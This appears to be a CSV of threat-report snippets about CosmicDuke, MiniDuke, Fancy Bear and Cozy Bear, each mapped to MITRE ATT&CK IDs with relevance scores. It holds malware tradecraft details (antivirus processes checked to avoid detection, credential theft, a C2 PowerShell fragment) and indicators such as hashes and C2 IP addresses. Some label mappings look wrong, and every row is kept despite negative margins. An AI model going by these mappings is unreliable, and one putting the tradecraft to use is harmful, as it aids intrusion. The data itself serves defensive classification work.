"query","candidate","type","p_relevant","p_irrelevant","adj_score","margin","keep","decision"
"Securelist; C. Raiu, I. Soumenkov, K. Baumgartner & V. Kamluk; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; https://www.securelist.com/en/downloads/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.pdf","S0596","S","0.854886","0.145114","0.854886","0.709772","True","keep"
"The program database (PDB) path y Server address and credentials y The loader y Filenames and decoy content Full list of the servers contacted by samples in these groupings in available in Appendix B | Servers on page 15.","T1574.007","T","0.947661","0.052339","0.947661","0.895322","True","keep"
"fb3b8f6494b211386381a7e4f6524d3e4643c9e9 b072577447cdf3936d95e612057e510dd3435963 f513b21738ae3083d79e4fa1039889e1c3efff58 c715e94dd187f3626f1b3e1511ae11525abf91e6 3e76dfa82161c64417e214b7607ad22ab40a8d69 ef3ce46a81d3f30fbcfbe5e0db18284329cc0d99 620165967306d08d6a38dbd1381d84c71d62dea2 Info-stealers Loaders *.tmp 4e3c9d7eb8302739e6931a3b5b605efe8f211e51 55f83ff166ab8978d6ce38e80fde858cf29e660b","S0177","S","0.355229","0.644771","0.355229","-0.289542","True","keep"
"For example, the credentials and same FTP folder structure used by the old samples have been used on another Cosmu FTP server that is still active.","TA0006","T","0.933566","0.066434","0.933566","0.867132","True","keep"
"A few older samples in Group #3 still use the original MiniDuke loader, while most recent ones are using the updated MiniDuke loader. FIGURE 1: SIMPLIFIED OVERVIEW OF COSMICDUKE'S CHAIN OF ACTION MiniDuke Loader Cosmu Info-stealer Exploit Dropper Decoy Attacker INTRODUCTION These old samples do not use the MiniDuke loader and therefore are not discussed in detail in this analysis. This is the only server that the samples with the original MiniDuke loader use.","S0177","S","0.96563","0.03437","0.96563","0.93126","True","keep"
"These old samples do not use the MiniDuke loader and therefore are not discussed in detail in this analysis.","S0137","S","0.976721","0.023279","0.976721","0.953442","True","keep"
"Key logging is skipped if one of the following AV process is running on the system: y avp.exe y acs.exe y outpost.exe y mcvsescn.exe y mcods.exe y navapsvc.exe y kav.exe y AvastSvc.exe y AvastUi.exe y nod32krn.exe y nod32.exe y ekern.exe y dwengine.exe y MsMpEng.exe y msseces.exe y ekrn.exe y savservice.exe y scfservice.exe y savadminservice.exe SCREENSHOTTER Cosmu takes screenshots periodically and sends them to the attacker, together with other stolen data.","T1546.002","T","0.079845","0.920155","0.079845","-0.84031","True","keep"
"The keylogger is implemented using the GetKeyboardState API.","T1056.001","T","0.831744","0.168256","0.831744","0.663488","True","keep"
"y Others ?? Windows credentials LM and NT hashes, cached domain passwords, LSA secrets.","T1552.001","T","0.247096","0.752904","0.247096","-0.505808","True","keep"
"?? Google Desktop Cosmu decrypts and steals saved credentials from Google Desktop.","S0276","S","0.967493","0.032507","0.967493","0.934986","True","keep"
"?? Google Desktop Cosmu decrypts and steals saved credentials from Google Desktop. ?? Google Talk Cosmu decrypts and steals saved credentials from Google Talk.","T1552.001","T","0.881583","0.118417","0.881583","0.763166","True","keep"
"?? Google Talk Cosmu decrypts and steals saved credentials from Google Talk.","S0290","S","0.907625","0.092375","0.907625","0.81525","True","keep"
"The attack was publicly documented in 2006","T1406","T","0.586916","0.413084","0.586916","0.173832","True","keep"
"PERSISTENCE Cosmu has a couple of different mechanisms for achieving persistence on the system.","T1070.009","T","0.835709","0.164291","0.835709","0.671418","True","keep"
"An interesting detail is that Cosmu skips searching the removable drive if the volume name is 'trandescend' (case insensitive comparison). COSMICDUKE Cosmu with a twist of MiniDuke TLP: WHITE Cosmu is the first malware family we have seen to share code with MiniDuke. FIGURE 1: SIMPLIFIED OVERVIEW OF COSMICDUKE'S CHAIN OF ACTION MiniDuke Loader Cosmu Info-stealer Exploit Dropper Decoy Attacker INTRODUCTION MAIN COMPONENT: INFO-STEALER The Cosmu info-stealer is the main component of the CosmicDuke malware. PERSISTENCE Cosmu has a couple of different mechanisms for achieving persistence on the system. TARGETED FILETYPES Cosmu searches the hard drives and network drives for files that match any of the below patterns: y *.doc y We have seen dozens of Cosmu samples that share code with MiniDuke.","S0188","S","0.967902","0.032098","0.967902","0.935804","True","keep"
"MAIN COMPONENT: INFO-STEALER The Cosmu info-stealer is the main component of the CosmicDuke malware. This particular dropper file is notable in that its info-stealer (SHA1:f513b21738ae3083d79e4fa1039889e1c3efff58) is the same one used by the exploit file named 'Bulletin-PISMNo-31-(625)-March-10-2014.pdf'.","S0491","S","0.783015","0.216985","0.783015","0.56603","True","keep"
"Polish Institute of International Affairs; http://www.pism.pl/en CIRCL - Computer Incident Response Center Luxembourg; Analysis of a stage 3 Miniduke sample; published 30 May 2013; http://www.circl.lu/assets/files/tr-14/circl-analysisreport-miniduke-stage3-public.pdf Laboratory of Cryptography and System Security (CrySyS Lab); MiniDuke: Indicators; published 27 February 2013; http://www.crysys.hu/miniduke/miniduke_indicators_public.pdf FIGURE 3: FILENAMES AND SHA1 VALUES OF COSMICDUKE EXPLOIT FILES","S1168","S","0.898687","0.101313","0.898687","0.797374","True","keep"
"Also of interest is that once the MiniDuke loader was updated, we saw CosmicDuke samples take the updated loader into use in mid-April 1 2014, a few months after MiniDuke started using the latest loader in mid-December 2013. Cosmu is the first malware family we have seen to share code with MiniDuke. We have seen dozens of Cosmu samples that share code with MiniDuke.","S0023","S","0.855497","0.144503","0.855497","0.710994","True","keep"
"Perhaps coincidentally, we found one MiniDuke sample (originally reported by CrySys [3] ) that also shows the same compilation date.","S0167","S","0.910856","0.089144","0.910856","0.821712","True","keep"
"The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author(s) of Cosmu and MiniDuke.","S0177","S","0.96261","0.03739","0.96261","0.92522","True","keep"
"Perhaps coincidentally, we found one MiniDuke sample (originally reported by CrySys [3] ) that also shows the same compilation date. The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011, which predates the oldest publicly documented MiniDuke sample (with a recorded loader compilation date of June 18 2012).","S0140","S","0.875186","0.124813","0.875186","0.750373","True","keep"
"Also of interest is that once the MiniDuke loader was updated, we saw CosmicDuke samples take the updated loader into use in mid-April 1 2014, a few months after MiniDuke started using the latest loader in mid-December 2013. It does not use an exploit and it does not use a dropper; instead the loader has a filename (Sivil Durum Raporu Kriz Merk?fdp.izay.exe) that uses the same RLO trick used in Group #1 samples. The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author(s) of Cosmu and MiniDuke. The parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting. The updated loader has PDB path, C:\Projects\NEMESIS\ nemesis-gemina\nemesis\bin\carriers\ezlzma_x86_exe.","T1645","T","0.960997","0.039003","0.960997","0.921994","True","keep"
"LOADER: MINIDUKE 3RD STAGE The CosmicDuke samples we analyzed used the same loader as MiniDuke's stage 3 [2] samples, making this the first occasion in which we've seen other malware using this particular loader.","S0062","S","0.952539","0.047461","0.952539","0.905078","True","keep"
"The code used by CosmicDuke to exploit the CVE-20110611 vulnerability appears to be derived from this proofof-concept code that was made available in early 2011: y http://www.exploit-db.com/exploits/17473/ When the file is launched, the object exploits the known CVE-2011-0611 vulnerability in specific versions of Adobe Flash, Reader and Acrobat products.","T0890","T","0.838353","0.161647","0.838353","0.676706","True","keep"
"DROPPER: DECOYS CosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched.","T1204.003","T","0.884779","0.115221","0.884779","0.769558","True","keep"
"The oldest Cosmu samples we saw have a compilation timestamp of 2001-09-25. This seems to be a common fake product name used in the latest Cosmu samples.","S0076","S","0.779121","0.22088","0.779121","0.558241","True","keep"
"COSMICDUKE Cosmu with a twist of MiniDuke TLP: WHITE CosmicDuke infections start by tricking victims into opening either a PDF file that contains an exploit or a Windows executable whose filename is manipulated to make it look like a document or image file. For convenience, we decided to name the samples showing this amalgamation of MiniDuke-derived loader and Cosmu-derived payload CosmicDuke . Image 1: Screenshot of folder containing CosmicDuke dropper files GROUP #1 DROPPERS: rcs .?????????? .doc In this document we report on our analysis of CosmicDuke - the first malware seen to include code from both the notorious MiniDuke APT trojan and another longstanding threat, the informationstealing Cosmu family. SOCIAL ENGINEERING Less technically challenging CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file. The code used by CosmicDuke to exploit the CVE-20110611 vulnerability appears to be derived from this proofof-concept code that was made available in early 2011: y http://www.exploit-db.com/exploits/17473/ The filenames and content used in CosmicDuke's attack files to lure victims into opening them contain references to the countries of Ukraine, Poland, Turkey and Russia,either generally in use of language or included detail, or in allusions to events or institutions. The parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting. When active on an infected machine, CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers, some of which were active at the time of writing.","S0665","S","0.956587","0.043413","0.956587","0.913174","True","keep"
"In this document we report on our analysis of CosmicDuke - the first malware seen to include code from both the notorious MiniDuke APT trojan and another longstanding threat, the informationstealing Cosmu family.","S0082","S","0.94429","0.05571","0.94429","0.88858","True","keep"
"When active on an infected machine, CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers, some of which were active at the time of writing.","T1552.001","T","0.940751","0.059249","0.940751","0.881502","True","keep"
"F-SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper CONTENTS INTRODUCTION Scope Target Arrival Infection Data theft Data transmission TECHNICAL DETAILS Dropper: RLO Dropper: Decoys Exploit Loader: MiniDuke 3rd Stage Main Component: Info-stealer RC4 Encryption Samples Comparison APPENDIX","TA0009","T","0.944713","0.055287","0.944713","0.889426","True","keep"
"While investigating MiniDuke loaders in April 2014, we were surprised to notice that the malicious executable being decompressed and loaded into memory was very similar to the Cosmu family of information-stealers, which we saw as long ago as 2001.","S0086","S","0.914993","0.085007","0.914993","0.829986","True","keep"
"This includes examining the attack files used to infect targets, the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info-stealers used in the samples. While investigating MiniDuke loaders in April 2014, we were surprised to notice that the malicious executable being decompressed and loaded into memory was very similar to the Cosmu family of information-stealers, which we saw as long ago as 2001.","S0177","S","0.971965","0.028035","0.971965","0.94393","True","keep"
"The data collection components include a keylogger, clipboard stealer, screenshotter, and password stealers for a variety of popular chat, email and web browsing programs. The keylogger is implemented using the GetKeyboardState API.","T1056.001","T","0.945932","0.054068","0.945932","0.891864","True","keep"
"The data collection components include a keylogger, clipboard stealer, screenshotter, and password stealers for a variety of popular chat, email and web browsing programs.","S0107","S","0.977138","0.022863","0.977138","0.954275","True","keep"
"It also collects information about the files on the system, and has the capability to export cryptographic certificates and the associated private keys.","T1552","T","0.963173","0.036827","0.963173","0.926346","True","keep"
"F-Secure has detections for all the different malicious components used by the Cosmu variants described in this report.","S1184","S","0.951496","0.048504","0.951496","0.902992","True","keep"
"For convenience, we decided to name the samples showing this amalgamation of MiniDuke-derived loader and Cosmu-derived payload CosmicDuke . Group #1 All samples in this group have a PDB path on the infected system's C:\ drive that contains the directory 'botgenstudio'. Group #2 All samples in this group have a PDB path that contains directories named 'NITRO' and 'SVA'. The full details of how the samples were grouped is listed on page 11; Figure 2 at left provides a quick summary of the grouping as they relate to how CosmicDuke is delivered, and the decoy documents shown. The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011, which predates the oldest publicly documented MiniDuke sample (with a recorded loader compilation date of June 18 2012). The samples we analyzed of the exploit-based CosmicDuke variety had the file names and SHA1 values listed in Figure 3 at right (see 'Appendix A | Samples' for more details). This includes examining the attack files used to infect targets, the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info-stealers used in the samples. This is the only server that the samples with the original MiniDuke loader use.","S0254","S","0.971677","0.028323","0.971677","0.943354","True","keep"
"DOCUMENT-BASED EXPLOIT CosmicDuke malware samples that use exploits to gain entry onto a target system (referred to as exploit files in the rest of this document) start with a malicious Flash object embedded into a PDF file.","S0051","S","0.974937","0.025063","0.974937","0.949874","True","keep"
"Unlike the CosmicDuke files geared towards social engineering, the exploit files do not actually display any documents to the user as a form of distraction; the malware simply straightaway exploits the vulnerability.","T1204.002","T","0.964806","0.035194","0.964806","0.929612","True","keep"
"It was executed via rundll32 commands such as: rundll32.exe ""C:\Windows\twain_64.dll"" In addition, FANCY BEAR's X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands.","T0867","T","0.931388","0.068612","0.931388","0.862776","True","keep"
"Powershell version of credential theft tool MimiKatz was also used by the actors to facilitate credential acquisition for lateral movement purposes.","S0007","S","0.937298","0.062702","0.937298","0.874596","True","keep"
"The encryption keys in the script were different on every system.","T1573.001","T","0.545692","0.454308","0.545692","0.091384","True","keep"
"sWP 'Wmi' 'Wmi' $aeK $aeI | Out-Null This one-line powershell command, stored only in WMI database, establishes an encrypted connection to C2 and downloads additional powershell modules from it, executing them in memory.","S0184","S","0.928955","0.071045","0.928955","0.85791","True","keep"
"This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones.","TA0104","T","0.956011","0.043989","0.956011","0.912022","True","keep"
"FANCY BEAR (also known as Sofacy or APT 28) is a separate Russian-based threat actor, which has been active since mid 2000s, and has been responsible for targeted intrusion campaigns against the Aerospace, Defense, Energy, Government and Media sectors. This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones.","S0023","S","0.965803","0.034197","0.965803","0.931606","True","keep"
"An HTTP protocol with encrypted payload is used for the Command & Control communication.","T0869","T","0.857878","0.142122","0.857878","0.715756","True","keep"
"They have extensive checks for the various security software that is installed on the system and their specific configurations.","S0194","S","0.983799","0.016201","0.983799","0.967598","True","keep"
"In addition to the US government, they have targeted organizations across the Defense, Energy, Extractive, Financial, Insurance, Legal, Manufacturing Media, Think Tanks, Pharmaceutical, Research and Technology industries, along with Universities. They have extensive checks for the various security software that is installed on the system and their specific configurations.","T1602","T","0.959078","0.040922","0.959078","0.918156","True","keep"
"COZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the White House, State Department, and US Joint Chiefs of Staff.","S1105","S","0.965955","0.034045","0.965955","0.93191","True","keep"
"In particular, we identified advanced methods consistent with nation-state level capabilities including deliberate targeting and 'access management' tradecraft - both groups were constantly going back into the environment to change out their implants, modify persistent methods, move to new Command & Control channels and perform other tasks to try to stay ahead of being detected.","TA0101","T","0.942026","0.057974","0.942026","0.884052","True","keep"
"'???the first day that we found activity on our network that was unusual, nefarious by adversaries???' ""we saw sort of very loud activity??? on one of our Window servers that couldn't have been done by one of us???an authorized user. After conducting this analysis and identifying the adversaries on the network, on June 10, 2016 we initiated a coordinated remediation event to ensure the intruders were removed and could not regain access.","T1071.002","T","0.948178","0.051822","0.948178","0.896356","True","keep"
"After conducting this analysis and identifying the adversaries on the network, on June 10, 2016 we initiated a coordinated remediation event to ensure the intruders were removed and could not regain access.","T0872","T","0.912651","0.087349","0.912651","0.825302","True","keep"
"third-party industry experts, like CrowdStrike, to investigate and remediate cyber attacks when they suspect a breach even if they are collaborating with law enforcement.","TA0007","T","0.955857","0.044143","0.955857","0.911714","True","keep"
"At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016. At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016.' COZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the White House, State Department, and US Joint Chiefs of Staff.","S0651","S","0.951588","0.048412","0.951588","0.903176","True","keep"
"Shawn Henry stated in his testimony that CrowdStrike had indicators of exfiltration (page 32 of the testimony): 'Counsel just reminded me that, as it relates to the DNC' we have indicators that data was exfiltrated. Shawn Henry stated in his testimony to the House Intelligence Committee that CrowdStrike had indicators of exfiltration (page 32) and that data had clearly left the network.","T1560","T","0.4013","0.5987","0.4013","-0.1974","True","keep"
"On page 32 of the testimony, Henry also explains that 'We don't have video of it happening, but there are indicators that it happened' and 'we did not have concrete evidence that data was exfiltrated from the DNC, but we have indicators that it was exfiltrated.'","S0400","S","0.621842","0.378158","0.621842","0.243684","True","keep"
"Of note, it is a standard practice in incident response to first coordinate a remediation event to prevent the adversary from doing further damage and following that to fully restore network functionality.","TA0041","T","0.890096","0.109904","0.890096","0.780192","True","keep"
"'???the first day that we found activity on our network that was unusual, nefarious by adversaries???' ""we saw sort of very loud activity??? on one of our Window servers that couldn't have been done by one of us???an authorized user.","T1418","T","0.775808","0.224192","0.775808","0.551616","True","keep"
"Together with our network of the top channel partners and over 200 service providers, we're on a mission to make sure everyone has the enterprise-grade cyber security we all need.","T1011","T","0.750721","0.249279","0.750721","0.501442","True","keep"
"ABOUT F-SECURE Nobody has better visibility into real-life cyber attacks than F-Secure. Founded in 1988, F-Secure is listed on the NASDAQ OMX Helsinki Ltd.","S1184","S","0.731809","0.268191","0.731809","0.463618","True","keep"
"Trojan:W64/CloudDuke.B Backdoor:W32/SeaDuke.","S0053","S","0.114223","0.885777","0.114223","-0.771554","True","keep"
"Trojan:W32/OnionDuke.C Trojan:W32/OnionDuke.","S1133","S","0.247977","0.752023","0.247977","-0.504046","True","keep"
"Trojan:W32/CosmicDuke.C Exploit:W32/CosmicDuke.","S1133","S","0.25343","0.74657","0.25343","-0.49314","True","keep"
"199.231.188.109 212.76.128.149 46.246.120.178 46.246.120.178 5.45.66.134 50.7.192.146 64.18.143.66 66.29.115.55 69.59.28.57 82.146.47.163 82.146.51.22 83.149.74.73 85.17.143.149 87.118.106.55 87.255.77.36 88.150.208.207 91.221.66.242 91.224.141.235 94.242.199.88 96.9.182.37 F-Secure detection names Backdoor:W32/MiniDuke.","S0568","S","0.135022","0.864978","0.135022","-0.729956","True","keep"
"Malware SHA1 hashes 42e6da9a08802b5ce5d1f754d4567665637b47bc CloudDuke Malware SHA1 hashes 04299c0b549d4a46154e0a754dda2bc9e43dff76 10b31a17449705be20890ddd8ad97a2feb093674 2e27c59f0cf0dbf81466cc63d87d421b33843e87 /.notdef 2f53bfcd2016d506674d0a05852318f9e8188ee1 317bde14307d8777d613280546f47dd0ce54f95b /.notdef 44403a3e51e337c1372b0becdab74313125452c7 47f26990d063c947debbde0e10bd267fb0f32719 /.notdef 4800d67ea326e6d037198abd3d95f4ed59449313 52d44e936388b77a0afdb21b099cf83ed6cbaa6f","S0574","S","0.208728","0.791272","0.208728","-0.582544","True","keep"
"f3dcbc016393497f681e12628ad9411c27e57d48 SeaDuke Malware SHA1 hashes 3459d9c27c31c0e8b2ea5b21fdc200e784c7edf4 aa7cf4f1269fa7bca784a18e5cecab962b901cc2 bb71254fbd41855e8e70f05231ce77fee6f00388 HammerDuke","S0574","S","0.259954","0.740046","0.259954","-0.480092","True","keep"
"OnionDuke Malware SHA1 hashes 073faad9c18dbe0e0285b2747eae0c629e56830c 145c5081037fad98fa72aa4d6dc6c193fdb1c127 16b632b4076a458b6e2087d64a42764d86b5b021 /.notdef 1e200fbb02dc4a51ea3ede0b6d1ff9004f07fe73 22bae6be13561cec758d25fa7adac89e67a1f33a 25e0af331b8e9fed64dc0df71a2687be348100e8 /.notdef 3bf6b0d49b8e594f8b59eec98942e1380e16dd22 /.notdef 42429d0c0cade08cfe4f72dcd77892b883e8a4bc /.notdef 5ccff14ce7c1732fadfe74af95a912093007357f 61283ef203f4286f1d366a57e077b0a581be1659","S0054","S","0.159531","0.840469","0.159531","-0.680938","True","keep"
"e95e2c166be39a4d9cd671531b376b1a8ceb4a55 edf74413a6e2763147184b5e1b8732537a854365 /.notdef efcb9be7bf162980187237bcb50f4da2d55430c2 /.notdef f62600984c5086f2da3d70bc1f5042cf464f928d CozyDuke Malware SHA1 hashes 01d3973e1bb46e2b75034736991c567862a11263 04aefbf1527536159d72d20dea907cbd080793e3 /.notdef 0e020c03fffabc6d20eca67f559c46b4939bb4f4 /.notdef 1e5f6a5624a9e5472d547b8aa54c6d146813f91d 207be5648c0a2e48be98dc4dc1d5d16944189219","S0046","S","0.339396","0.660604","0.339396","-0.321208","True","keep"
"MiniDuke Malware SHA1 hashes 00852745cb40730dc333124549a768b471dff4bc 03661a5e2352a797233c23883b25bb652f03f205 045867051a6052d1d910abfcb24a7674bcc046ca","S0137","S","0.175633","0.824367","0.175633","-0.648734","True","keep"
"GeminiDuke Malware SHA1 hashes 3ed561786ca07c8e9862f4f682c1828a039d6dd4 6b0b8ad038c7ae2efbad066b8ba22de859b81f98 a3653091334892cf97a55715c7555c8881230bc4 b14b9241197c667f00f86d096d71c47d6fa9aca6 c011552d61ac5a87d95e43b90f2bf13077856def CosmicDuke Malware SHA1 hashes 01e5080b832c6e4fcb7b9d06caffe03dab8d95da 02f55947402689ec755356ab6b0345a592446da7","S0050","S","0.19157","0.80843","0.19157","-0.61686","True","keep"
"Available: https://securelist.com/blog/research/71443/minidionis-one-more-apt-with-a-usage-of-cloud- drives/ malware@prevenity; Malware w 5 rocznic?? katastrofy samolotu; published 22 April 2015;","S1151","S","0.686651","0.313349","0.686651","0.373302","True","keep"
"com/2015/07/ tracking-minidionis-cozycars-new-ride-is-related-to-seaduke/ Segey Lozhkin; Securelist; Minidionis - one more APT with a usage of cloud drives; published 16 July 2015;","S0054","S","0.476952","0.523048","0.476952","-0.046096","True","keep"
"CLOUDDUKE First known activity June 2015 Most recent known activity Summer 2015 Other names MiniDionis, CloudLook C&C communication methods HTTP (S), Microsoft OneDrive Known toolset components ??? Downloader ??? Loader ??? Two backdoor variants CloudDuke is a malware toolset known to consist of, at least, a downloader, a loader and two backdoor variants. com/2015/07/ tracking-minidionis-cozycars-new-ride-is-related-to-seaduke/ Segey Lozhkin; Securelist; Minidionis - one more APT with a usage of cloud drives; published 16 July 2015; com/weblog/archives/00002822.html Brandon Levene, Robert Falcone and Richard Wartell; Palo Alto Networks; Tracking MiniDionis: CozyCar's New Ride Is Related to Seaduke; published 14 July 2015; http://researchcenter.","S0405","S","0.8442","0.1558","0.8442","0.6884","True","keep"
"Available: https://www.f-secure.com/ documents/996508/ 1030745/CozyDuke Symantec Security Response; 'Forkmeiamfamous': Seaduke, latest weapon in the Duke armory; published 13 July 2015; [Online].","S0185","S","0.768546","0.231454","0.768546","0.537092","True","keep"
"Available: http://www.boost.org/users/ history/ version_1_54_0.html Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014;","S0175","S","0.962618","0.037382","0.962618","0.925236","True","keep"
"Available: http://blog.trendmicro.com/trendlabs-security- intelligence/pawnstorms-domestic-spying-campaign-revealed-ukraine-and-us-top-global-targets/ GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014;","S0665","S","0.911475","0.088525","0.911475","0.82295","True","keep"
"Available: http://www.crysys.hu/miniduke/miniduke_indicators_public.pdf Mikko Hypponen; F-Secure Weblog; Targeted Attacks and Ukraine; published 1 April 2014;","S0697","S","0.610039","0.389961","0.610039","0.220078","True","keep"
"pdf Laboratory of Cryptography and System Security (CrySyS Lab); Miniduke: Indicators; published 27 February 2013;","S0458","S","0.952143","0.047857","0.952143","0.904286","True","keep"
